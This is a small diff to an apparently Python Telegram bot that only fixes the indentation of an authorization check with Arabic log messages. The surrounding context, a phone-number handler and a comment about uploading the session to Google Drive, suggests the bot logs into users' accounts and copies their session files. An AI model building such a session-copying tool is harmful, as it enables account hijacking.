@@ -126,10 +126,11 @@ async def process_phone(update, context):
         await client.connect()
         print("تم إنشاء الاتصال بـ Telegram.")
         print("قبل التحقق من إذا كان المستخدم مصرح له.")
-       if await client.is_user_authorized():
-           print("المستخدم مصرح له مسبقًا.")
-       else:
-           print("المستخدم غير مصرح له. سيتم إرسال رمز التحقق.")
+        if await client.is_user_authorized():
+            print("المستخدم مصرح له مسبقًا.")
+        else:
+            print("المستخدم غير مصرح له. سيتم إرسال رمز التحقق.")
+        
         if await client.is_user_authorized():
             print("المستخدم مصرح له مسبقًا.")
             # رفع الجلسة إلى Google Drive
